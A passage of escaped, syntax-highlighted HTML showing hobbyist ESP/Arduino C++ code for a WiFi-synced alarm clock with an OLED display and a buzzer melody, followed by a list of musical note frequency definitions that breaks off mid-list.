style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#75715e\"\u003e// initialize the display and set font\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e  display.init();\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  display.flipScreenVertically();\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  display.setFont(ArialMT_Plain_10);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  connectToWiFi();\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#75715e\"\u003e// set pin 14 for output\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e  pinMode(\u003cspan style=\"color:#ae81ff\"\u003e14\u003c/span\u003e, OUTPUT);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  playMelody();\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  display.drawString(\u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;hello\u0026#34;\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  display.display();\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  delay(\u003cspan style=\"color:#ae81ff\"\u003e3000\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  display.clear();\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#75715e\"\u003e// show the mac address in serial and on the screen\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e  Serial.print(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;ESP Board MAC Address:  \u0026#34;\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  Serial.println(WiFi.macAddress());\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  display.drawString(\u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e10\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;ESP Board MAC Address: \u0026#34;\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  display.drawString(\u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e20\u003c/span\u003e, WiFi.macAddress());\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  display.display();\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#75715e\"\u003e// show the IP address on screen\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e  display.drawString(\u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e40\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;ESP Board IP Address: \u0026#34;\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  display.drawString(\u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e50\u003c/span\u003e, WiFi.localIP().toString());\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  display.display();\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#75715e\"\u003e// start the time client and set timezone GMT -8\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e  timeClient.begin();\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  timeClient.setTimeOffset(\u003cspan style=\"color:#f92672\"\u003e-\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e25200\u003c/span\u003e); delay(\u003cspan style=\"color:#ae81ff\"\u003e5000\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#75715e\"\u003e// get the datetime\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e  \u003cspan style=\"color:#66d9ef\"\u003ewhile\u003c/span\u003e(\u003cspan style=\"color:#f92672\"\u003e!\u003c/span\u003etimeClient.update()) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    timeClient.forceUpdate();\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#75715e\"\u003e// Extract Date and Time\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e  formattedDate \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e timeClient.getFormattedTime();\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003eint\u003c/span\u003e epochTime \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e timeClient.getEpochTime();\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  setTime(epochTime);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  Serial.println(formattedDate);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#75715e\"\u003e// Extract date\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e  \u003cspan style=\"color:#66d9ef\"\u003eint\u003c/span\u003e splitT \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e formattedDate.indexOf(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;T\u0026#34;\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  dayStamp \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e formattedDate.substring(\u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e,splitT);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  display.drawString(\u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;TIME: \u0026#34;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e dayStamp);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  display.display();\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#75715e\"\u003e// save some power\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e  WiFi.mode(WIFI_OFF);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003evoid\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eloop\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#75715e\"\u003e// clear the screen and update the time  \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e  display.clear();\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  display.setFont(ArialMT_Plain_16);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  display.drawString(\u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e,\u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e, String(hour()) \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;:\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e twoDigits(minute()) \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;:\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e twoDigits(second()));\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  display.display();\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#75715e\"\u003e// The alarm. This is for 6:25 am. 1430 for 2:30 pm\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e  \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e (String(hour()) \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e String(minute()) \u003cspan style=\"color:#f92672\"\u003e==\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;625\u0026#34;\u003c/span\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    playMelody();\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#75715e\"\u003e// update the time every so often. In milliseconds\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e  delay(\u003cspan style=\"color:#ae81ff\"\u003e1000\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-cpp\" data-lang=\"cpp\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e// contains note definitions so you don\u0026#39;t need to know specific frequencies. Just a bit of music theory\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\u003cspan style=\"color:#75715e\"\u003e#define NOTE_B0  31\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#define NOTE_C1  33\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#define NOTE_CS1 35\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#define NOTE_D1  37\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#define NOTE_DS1 39\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#define NOTE_E1  41\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#define NOTE_F1  44\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#define NOTE_FS1 46\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#define NOTE_G1  49\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#define NOTE_GS1 52\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#define NOTE_A1  55\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#define NOTE_AS1 58\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#define NOTE_B1  62\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#define NOTE_C2  65\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#define NOTE_CS2 69\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#define NOTE_D2  73\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#define NOTE_DS2 78\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#define NOTE_E2  82\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#define NOTE_F2  87\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#define NOTE_FS2 93\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#define NOTE_G2  98\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#define NOTE_GS2 104\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#define NOTE_A2  110\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#define NOTE_AS2 117\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#define NOTE_B2  123\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#define NOTE_C3  131\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#define NOTE_CS3 139\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#define NOTE_D3  147\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#define NOTE_DS3 156\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#define NOTE_E3  165\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#define NOTE_F3  175\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#define NOTE_FS3 185\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#define NOTE_G3  196\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#define NOTE_GS3 208\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#define NOTE_A3  220\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#define NOTE_AS3 233\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#define NOTE_B3  247\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#define NOTE_C4  262\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#define NOTE_CS4 277\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#define NOTE_D4  294\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#define NOTE_DS4 311\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#define NOTE_E4  330\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#define NOTE_F4  349\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#define NOTE_FS4 370\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#define NOTE_G4  392\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#define NOTE_GS4 415\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#define NOTE_A4  440\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#define NOTE_AS4 466\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#define NOTE_B4  494\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#define NOTE_C5  523\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#define NOTE_CS5 554\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#define NOTE_D5  587\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#define NOTE_DS5 622\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#define NOTE_E5  659\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#define NOTE_F5  698\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#define NOTE_FS5 740\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#define NOTE_G5  784\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#define NOTE_GS5 831\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#define NOTE_A5  880\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#define NOTE_AS5 932\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#define NOTE_B5  988\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#define NOTE_C6  1047\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#define NOTE_CS6 1109\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#define NOTE_D6  1175\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#define NOTE_DS6 1245\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#define NOTE_E6  1319\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#define NOTE_F6  1397\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#define NOTE_FS6 1480\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#define NOTE_G6  1568\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#define NOTE_GS6 1661\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#define NOTE_A6  1760\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#define NOTE_AS6 1865\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#define NOTE_B6  1976\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#define NOTE_C7  2093\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#define NOTE_CS7 2217\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#define NOTE_D7  2349\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#define NOTE_DS7 2489\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#define NOTE_E7  2637\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#define NOTE_F7  2794\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan 